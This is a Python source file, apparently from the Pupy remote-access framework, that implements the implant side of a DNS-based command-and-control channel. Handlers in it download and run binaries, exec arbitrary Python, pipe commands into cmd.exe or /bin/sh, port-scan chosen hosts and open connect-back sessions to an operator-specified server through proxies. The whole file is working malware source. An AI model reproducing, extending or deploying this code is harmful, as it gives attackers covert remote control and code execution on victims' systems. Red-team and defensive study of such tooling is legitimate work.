# -*- coding: utf-8 -*-
# Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)

__all__ = ['DNSCommandClientLauncher']

from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
from ..picocmd.client import DnsCommandsClient
from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort

from ..proxies import find_proxies_for_transport, connect_client_with_proxy_info
from ..utils import create_client_transport_info_for_addr, HostInfo

from ..socks import ProxyError

from ..online import PortQuiz, check
from ..scan import scan

from threading import Thread, Lock

from time import sleep

import socket
import os

import subprocess

import tempfile
import platform

import pupy
from network.lib import getLogger

logger = getLogger('dnscnc')


class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain, doh=False, ns=None, qtype=None, ns_timeout=3):
        self.stream = None
        self.commands = []
        self.lock = Lock()
        self.doh = doh

        try:
            import pupy_credentials
            key = pupy_credentials.DNSCNC_PUB_KEY_V2
        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            key = credentials['DNSCNC_PUB_KEY_V2']

        DnsCommandsClient.__init__(
            self, domain, key, doh, ns, qtype, ns_timeout=ns_timeout
        )

    def on_session_established(self):
        pupy.client.set_info('spi', '{:08x}'.format(self.spi))

    def on_session_lost(self):
        pupy.client.unset_info('spi')

    def on_downloadexec_content(self, url, action, content):
        self.on_pastelink_content(url, action, content)

    def on_pastelink_content(self, url, action, content):
        if action.startswith('exec'):
            tmp_path = None

            try:
                fd, tmp_path = tempfile.mkstemp()
                tmp = os.fdopen(fd, 'wb')
                tmp.write(content)
                tmp.close()

                if not platform.system == 'Windows':
                    os.chmod(tmp_path, 0700)

                os.system(tmp_path)

            except Exception as e:
                logger.exception(e)

            finally:
                if tmp_path:
                    os.unlink(tmp_path)

        elif action.startswith('pyexec'):
            try:
                exec content
            except Exception as e:
                logger.exception(e)
        elif action.startswith('sh'):
            try:
                pipe = None
                if platform.system == 'Windows':
                    kwargs = {
                        'stdin': subprocess.PIPE
                    }

                    if hasattr(subprocess, 'STARTUPINFO'):
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= \
                          subprocess.CREATE_NEW_CONSOLE | \
                          subprocess.STARTF_USESHOWWINDOW

                        kwargs.update({
                            'startupinfo': startupinfo,
                        })

                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                else:
                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)

                pipe.stdin.write(content)
                pipe.stdin.close()
                pipe.communicate()

            except Exception as e:
                logger.exception(e)

    def _checkconnect_worker(self, host, port_start, port_end):
        ports = xrange(port_start, port_end+1)
        connectable = scan([str(host)], ports)
        while connectable:
            chunk = [x[1] for x in connectable[:5]]
            connectable = connectable[5:]
            self.event(ConnectablePort(host, chunk))

    def on_checkconnect(self, host, port_start, port_end):
        worker = Thread(target=self._checkconnect_worker, args=(
            host, port_start, port_end))
        worker.daemon = True
        worker.start()

    def _checkonline_worker(self):
        logger.debug('CheckOnline worker started')
        portquiz = PortQuiz()
        portquiz.start()

        try:
            offset, mintime, register = check()
            logger.debug('OnlineStatus completed: %04x %04x %08x',
                offset, mintime, register)
            self.event(OnlineStatus(offset, mintime, register))
        except Exception, e:
            logger.exception('Online status check failed: %s', e)

        logger.debug('Wait for PortQuiz completion')
        portquiz.join()
        logger.debug('PortQuiz completed')

        try:
            if portquiz.available:
                self.event(PortQuizPort(portquiz.available[:8]))
        except Exception, e:
            logger.exception(e)

        logger.debug('CheckOnline worker completed')

    def on_checkonline(self):
        worker = Thread(target=self._checkonline_worker)
        worker.daemon = True
        worker.start()

    def on_connect(self, address, port, transport, proxy, hostname=None):
        logger.debug(
            'connect request: %s:%s %s %s%s',
            address, port, transport, proxy, (' host=' + hostname) if hostname else ''
        )

        with self.lock:
            if self.stream and not self.stream.closed:
                logger.debug('ignoring connection request. stream = %s', self.stream)
                return

            self.commands.append(('connect', address, port, transport, proxy, hostname))

    def on_disconnect(self):
        logger.debug('disconnect request [stream=%s]', self.stream)
        with self.lock:
            if self.stream:
                self.stream.close()
                self.stream = None

    def on_exit(self):
        with self.lock:
            if self.stream:
                self.stream.close()

        os._exit(0)

class DNSCncLauncher(BaseLauncher):
    ''' Micro command protocol built over DNS infrastructure '''

    name = 'dnscnc'
    credentials = ['DNSCNC_PUB_KEY_V2']

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
        super(DNSCncLauncher, self).__init__(*args, **kwargs)
        self.dnscnc = None
        self.exited = False
        self.doh = False

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)

        self.doh = self.args.doh
        self.ns = self.args.ns
        self.ns_timeout = self.args.ns_timeout
        self.qtype = self.args.qtype

    def activate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        logger.info('Activating CNC protocol. Domain: %s', self.args.domain)

        self.pupy = __import__('pupy')
        self.dnscnc = DNSCommandClientLauncher(
            self.args.domain, self.doh, self.ns, self.qtype, self.ns_timeout)
        self.dnscnc.daemon = True
        self.dnscnc.start()

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog='dnscnc', description=cls.__doc__
        )

        cls.arg_parser.add_argument(
            '--domain',
            metavar='<domain>',
            required=True,
            help='controlled domain (hostname only, no IP, '
               'you should properly setup NS first. Port is NOT supported)'
        )

        cls.arg_parser.add_argument(
            '--ns', help='DNS server (will use internal DNS library)'
        )

        cls.arg_parser.add_argument(
            '--doh', help='Use DNS-over-HTTPS', default=False, action='store_true'
        )

        cls.arg_parser.add_argument(
            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
            default=3, type=int,
        )

        cls.arg_parser.add_argument(
            '--qtype',
            choices=['A', 'AAAA'], default=None,
            help='DNS query type (For now only A and AAAA are supported)'
        )


    def iterate(self):
        if not self.dnscnc:
            self.activate()

        while not self.exited and not pupy.client.terminated:
            try:
                connection = self.process()
                if not connection:
                    continue

                stream, transport = connection
                if not stream:
                    continue

                logger.debug('stream created, yielding - %s', stream)

                self.dnscnc.stream = stream

                yield stream

                with self.dnscnc.lock:
                    logger.debug('stream completed - %s', stream)

                    self.dnscnc.stream = None

            except Exception, e:
                logger.exception(e)

    def process(self):
        command = None
        connection = None
        wait = False

        with self.dnscnc.lock:
            if self.dnscnc.commands:
                command = self.dnscnc.commands.pop()

            if not command:
                wait = True

            elif command[0] == 'connect':
                try:
                    connection = self.on_connect(command)
                except socket.error:
                    pass

                if not connection:
                    self.event(0x20000000 | 0xFFFE)

        if wait:
            sleep(5)

        return connection

    def connect_to_host(self, host_info, transport, proxies):
        logger.info('connecting to %s:%d (hostname=%s) using transport %s ...',
            host_info.host, host_info.port, host_info.hostname,
            transport
        )

        transport_info = create_client_transport_info_for_addr(
            transport, host_info
        )

        logger.info('using client options: %s', transport_info.client_args)
        logger.info('using transports options: %s', transport_info.transport_args)

        auto = True

        if proxies is False:
            auto = False
            proxies = None
        elif proxies is True:
            proxies = None

        proposed_proxy_infos = find_proxies_for_transport(
            transport_info, host_info,
            wan_proxies=proxies,
            auto=auto
        )

        for proxy_info in proposed_proxy_infos:
            try:
                yield connect_client_with_proxy_info(
                    transport_info, proxy_info)

            except (ProxyError, EOFError) as e:
                logger.info(
                    'Connection to %s:%d using %s failed: %s',
                    host_info.host, host_info.port, proxy_info.chain, e
                )
            except Exception as e:
                logger.exception(e)


    def on_connect(self, command):
        logger.debug('processing connection command')

        stream = None
        transport = None

        _, host, port, transport, connection_proxy, hostname = command

        if connection_proxy is None:
            logger.debug('Connection proxy: autodetect')
        elif connection_proxy is True:
            logger.debug('Connection proxy: omit direct')
        elif connection_proxy is False:
            logger.debug('Connection proxy: disabled')
        elif len(connection_proxy) == 1:
            logger.debug('Connection proxy: one: %s', connection_proxy[0])
        else:
            logger.debug('Connection proxy: chain: %s', connection_proxy)

        host_info = HostInfo(host, port, hostname)

        streams_iterator = self.connect_to_host(
            host_info, transport, connection_proxy)

        while True:
            try:
                stream = next(streams_iterator)
                break

            except EOFError as e:
                logger.info('Connection closed: %s', e)

            except StopIteration:
                break

            except Exception as e:
                logger.exception(e)

        if stream:
            self.set_connection_info(hostname, host, port, connection_proxy, transport)
        else:
            logger.debug('All connection attempt has been failed')
            self.reset_connection_info()

        return stream, transport

    def get_transport(self):
        return self._current_transport
